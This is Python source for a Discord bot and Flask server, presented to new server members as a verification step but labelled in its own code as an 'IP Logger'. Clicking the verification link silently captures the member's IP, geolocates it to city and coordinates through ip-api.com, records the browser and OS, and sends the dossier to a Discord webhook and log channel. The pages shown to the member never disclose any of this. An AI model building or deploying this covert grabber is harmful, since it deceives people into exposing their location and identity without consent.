from flask import Flask, request, make_response, redirect, render_template_string
from werkzeug.middleware.proxy_fix import ProxyFix
import discord
from discord import app_commands
from discord.ext import commands
import traceback
import requests
import base64
import httpagentparser
import os
import asyncio
import threading
import secrets
from datetime import datetime

__app__ = "Discord Verification Bot with IP Logger"
__description__ = "Bot de verificación de Discord con sistema de tracking de IP"
__version__ = "v3.1 - Render.com"

def extract_id(value):
    if not value or value == "0":
        return 0
    if "/" in value:
        return int(value.split("/")[-1])
    return int(value)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
GUILD_ID = extract_id(os.environ.get("GUILD_ID", "0"))
VERIFIED_ROLE_ID = extract_id(os.environ.get("VERIFIED_ROLE_ID", "0"))
LOG_CHANNEL_ID = extract_id(os.environ.get("LOG_CHANNEL_ID", "0"))
WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK", "")

verification_tokens = {}

config = {
    "webhook": WEBHOOK_URL,
    "image": "https://imgs.search.brave.com/geKqfzhGIij5BKTa-lps4eolKm8I6p-SYOlVNWUmrh0/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pLnBp/bmltZy5jb20vb3Jp/Z2luYWxzLzkzL2Fj/LzU3LzkzYWM1Nzkx/ZGVlYjRjZDRhZThh/ODU3MzQ4NTY5Y2U1/LmpwZw",
    "imageArgument": True,
    "username": "Verification Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
}

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'✅ Bot conectado como {bot.user}', flush=True)
    try:
        synced = await bot.tree.sync()
        print(f'✅ {len(synced)} comandos sincronizados', flush=True)
    except Exception as e:
        print(f'❌ Error sincronizando comandos: {e}', flush=True)

def get_domain():
    """Obtiene el dominio correcto dependiendo del entorno (Render o desarrollo local)"""
    if 'RENDER_EXTERNAL_URL' in os.environ:
        domain = os.environ['RENDER_EXTERNAL_URL'].replace('https://', '').replace('http://', '')
        print(f'🌐 Usando dominio de Render: {domain}', flush=True)
        return domain
    elif 'RENDER' in os.environ:
        service_name = os.environ.get('RENDER_SERVICE_NAME', 'app')
        domain = f"{service_name}.onrender.com"
        print(f'🌐 Usando dominio inferido de Render: {domain}', flush=True)
        return domain
    else:
        domain = 'localhost:5000'
        print(f'🌐 Usando dominio local: {domain}', flush=True)
        return domain

@bot.event
async def on_member_join(member):
    try:
        if member.guild.id != GUILD_ID:
            return
        
        print(f'👤 Nuevo miembro: {member.name} (ID: {member.id})', flush=True)
        
        verification_token = secrets.token_urlsafe(32)
        verification_tokens[verification_token] = {
            'user_id': member.id,
            'username': str(member),
            'joined_at': datetime.now().isoformat()
        }
        
        domain = get_domain()
        
        if domain.startswith('localhost'):
            verification_url = f"http://{domain}/verify/{verification_token}"
        else:
            verification_url = f"https://{domain}/verify/{verification_token}"
        
        embed = discord.Embed(
            title="🔒 Verificación Requerida",
            description=f"¡Bienvenido/a a **{member.guild.name}**!\n\nPara acceder al servidor, necesitas verificarte haciendo clic en el botón de abajo.",
            color=0x00FF00
        )
        embed.add_field(name="📋 Instrucciones", value="1. Haz clic en 'Verificar'\n2. Se abrirá una página en tu navegador\n3. Serás verificado automáticamente", inline=False)
        embed.set_footer(text="Este enlace es único y solo funciona una vez")
        
        view = discord.ui.View(timeout=None)
        button = discord.ui.Button(label="✅ Verificar", style=discord.ButtonStyle.link, url=verification_url)
        view.add_item(button)
        
        try:
            await member.send(embed=embed, view=view)
            print(f'✅ Mensaje de verificación enviado a {member.name}', flush=True)
        except discord.Forbidden:
            print(f'❌ No se pudo enviar MD a {member.name} (DMs cerrados)', flush=True)
            
            for channel in member.guild.text_channels:
                if channel.permissions_for(member.guild.me).send_messages:
                    try:
                        await channel.send(f'{member.mention} revisa tus mensajes directos para verificarte.', embed=embed, view=view, delete_after=60)
                        break
                    except:
                        continue
    
    except Exception as e:
        print(f'❌ Error en on_member_join: {e}', flush=True)
        print(traceback.format_exc(), flush=True)

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def sendVerificationLog(ip, useragent, user_data):
    try:
        os_name, browser = httpagentparser.simple_detect(useragent)
        
        info = None
        try:
            info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
            if info and info.get("status") == "fail":
                info = None
        except:
            info = None
        
        if info:
            description = f"""**🎉 Usuario Verificado!**

**👤 Usuario de Discord:**
> **Username:** `{user_data['username']}`
> **ID:** `{user_data['user_id']}`
> **Unido al servidor:** `{user_data['joined_at']}`

**🌐 Información de IP:**
> **IP:** `{ip}`
> **Proveedor:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **País:** `{info.get('country', 'Unknown')}`
> **Región:** `{info.get('regionName', 'Unknown')}`
> **Ciudad:** `{info.get('city', 'Unknown')}`
> **Coordenadas:** `{str(info.get('lat', 'N/A'))}, {str(info.get('lon', 'N/A'))}`
> **Zona Horaria:** `{info.get('timezone', 'Unknown')}`
> **Móvil:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot/Hosting:** `{info.get('hosting', False)}`

**💻 Información del PC:**
> **OS:** `{os_name}`
> **Navegador:** `{browser}`

**🔍 User Agent:**
```
{useragent}
```"""
        else:
            description = f"""**🎉 Usuario Verificado!**

**👤 Usuario de Discord:**
> **Username:** `{user_data['username']}`
> **ID:** `{user_data['user_id']}`
> **Unido al servidor:** `{user_data['joined_at']}`

**🌐 Información de IP:**
> **IP:** `{ip}`

**💻 Información del PC:**
> **OS:** `{os_name}`
> **Navegador:** `{browser}`

**🔍 User Agent:**
```
{useragent}
```"""
        
        embed_data = {
            "username": "Verification Logger",
            "embeds": [{
                "title": "✅ Nueva Verificación Completada",
                "color": 0x00FF00,
                "description": description,
                "timestamp": datetime.utcnow().isoformat()
            }]
        }
        
        if WEBHOOK_URL:
            requests.post(WEBHOOK_URL, json=embed_data, timeout=5)
            print(f'✅ Log enviado a webhook para usuario {user_data["username"]}', flush=True)
        
        asyncio.run_coroutine_threadsafe(
            send_log_to_channel(user_data, ip, info, os_name, browser, useragent),
            bot.loop
        )
        
    except Exception as e:
        print(f'❌ Error enviando log: {e}', flush=True)

async def send_log_to_channel(user_data, ip, info, os_name, browser, useragent):
    try:
        # Si no hay canal de logs configurado, simplemente retornamos sin error
        if not LOG_CHANNEL_ID or LOG_CHANNEL_ID == 0:
            print('ℹ️ Canal de logs no configurado - Omitiendo logging', flush=True)
            # Continuamos con la asignación del rol
            guild = bot.get_guild(GUILD_ID)
            if guild:
                member = guild.get_member(user_data['user_id'])
                if member:
                    role = guild.get_role(VERIFIED_ROLE_ID)
                    if role:
                        await member.add_roles(role)
                        print(f'✅ Rol verificado asignado a {member.name}', flush=True)
                        try:
                            await member.send("🎉 ¡Verificación completada! Ya tienes acceso al servidor.")
                        except:
                            pass
            return

        channel = bot.get_channel(LOG_CHANNEL_ID)
        if not channel:
            print(f'ℹ️ Canal de logs {LOG_CHANNEL_ID} no encontrado - Omitiendo logging', flush=True)
            return
        
        embed = discord.Embed(
            title="✅ Nueva Verificación Completada",
            color=0x00FF00,
            timestamp=datetime.utcnow()
        )
        
        embed.add_field(name="👤 Usuario", value=f"**Username:** {user_data['username']}\n**ID:** {user_data['user_id']}", inline=False)
        
        if info:
            embed.add_field(
                name="🌐 Ubicación",
                value=f"**IP:** `{ip}`\n**País:** {info.get('country', 'Unknown')}\n**Ciudad:** {info.get('city', 'Unknown')}\n**Proveedor:** {info.get('isp', 'Unknown')}",
                inline=True
            )
        else:
            embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
        
        embed.add_field(name="💻 Sistema", value=f"**OS:** {os_name}\n**Navegador:** {browser}", inline=True)
        
        await channel.send(embed=embed)
        print(f'✅ Embed enviado al canal de logs', flush=True)
        
        guild = bot.get_guild(GUILD_ID)
        if guild:
            member = guild.get_member(user_data['user_id'])
            if member:
                role = guild.get_role(VERIFIED_ROLE_ID)
                if role:
                    await member.add_roles(role)
                    print(f'✅ Rol verificado asignado a {member.name}', flush=True)
                    
                    try:
                        await member.send("🎉 ¡Verificación completada! Ya tienes acceso al servidor.")
                    except:
                        pass
    
    except Exception as e:
        print(f'❌ Error en send_log_to_channel: {e}', flush=True)
        print(traceback.format_exc(), flush=True)

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=2, x_proto=1, x_host=1, x_prefix=1)

@app.route('/health')
def health():
    """Health check endpoint para Render"""
    return {'status': 'ok', 'bot_connected': bot.is_ready()}, 200

@app.route('/verify/<token>')
def verify(token):
    try:
        if token not in verification_tokens:
            return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>Verificación Inválida</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            text-align: center;
        }
        h1 { color: #e74c3c; }
        p { color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>❌ Verificación Inválida</h1>
        <p>Este enlace de verificación no es válido o ya fue utilizado.</p>
    </div>
</body>
</html>
            """), 400
        
        user_data = verification_tokens.pop(token)
        
        forwarded_for = request.headers.get('X-Forwarded-For', '')
        if forwarded_for:
            client_ip = forwarded_for.split(',')[0].strip()
        else:
            client_ip = request.remote_addr
        
        user_agent = request.headers.get('User-Agent', '')
        
        print(f'🔐 Verificación completada - Usuario: {user_data["username"]}, IP: {client_ip}', flush=True)
        
        sendVerificationLog(client_ip, user_agent, user_data)
        
        return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>Verificación Exitosa</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            text-align: center;
            animation: slideIn 0.5s ease-out;
        }
        @keyframes slideIn {
            from {
                transform: translateY(-50px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        h1 {
            color: #27ae60;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            font-size: 18px;
        }
        .checkmark {
            font-size: 80px;
            color: #27ae60;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="checkmark">✓</div>
        <h1>¡Verificación Exitosa!</h1>
        <p>Has sido verificado correctamente.</p>
        <p>Ya puedes cerrar esta ventana y acceder al servidor de Discord.</p>
    </div>
</body>
</html>
        """)
    
    except Exception as e:
        print(f'❌ Error en /verify: {e}', flush=True)
        print(traceback.format_exc(), flush=True)
        return '500 - Internal Server Error', 500

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>Discord Verification Bot</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            text-align: center;
        }
        h1 { color: #667eea; }
        p { color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🤖 Discord Verification Bot</h1>
        <p>Sistema de verificación activo</p>
    </div>
</body>
</html>
    """)

def run_flask():
    port = int(os.environ.get('PORT', 5000))
    print(f'🌐 Iniciando servidor Flask en puerto {port}...', flush=True)
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

def run_bot():
    print('🤖 Iniciando bot de Discord...', flush=True)
    try:
        bot.run(BOT_TOKEN)
    except discord.errors.LoginFailure as e:
        print(f"❌ ERROR DE AUTENTICACIÓN: {e}", flush=True)
        print("", flush=True)
        print("⚠️  El BOT_TOKEN parece ser inválido.", flush=True)
        print("📝 Por favor, verifica que:", flush=True)
        print("   1. El token es correcto (ve a Discord Developer Portal)", flush=True)
        print("   2. El token no tiene espacios al inicio o final", flush=True)
        print("   3. El bot está habilitado en Discord Developer Portal", flush=True)
        print("", flush=True)
        print("✅ El servidor Flask sigue funcionando en el puerto 5000", flush=True)
        print("   Puedes acceder a /health para verificar el estado", flush=True)
        
        while True:
            import time
            time.sleep(60)
    except Exception as e:
        print(f"❌ ERROR INESPERADO: {e}", flush=True)
        while True:
            import time
            time.sleep(60)

if __name__ == '__main__':
    print(f"🚀 Iniciando {__app__} {__version__}", flush=True)
    print(f"Guild ID: {GUILD_ID}", flush=True)
    print(f"Verified Role ID: {VERIFIED_ROLE_ID}", flush=True)
    print(f"Log Channel ID: {LOG_CHANNEL_ID}", flush=True)
    
    if not BOT_TOKEN:
        print("❌ ERROR: BOT_TOKEN no configurado!", flush=True)
        print("Por favor, configura las variables de entorno necesarias.", flush=True)
        exit(1)
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    run_bot()
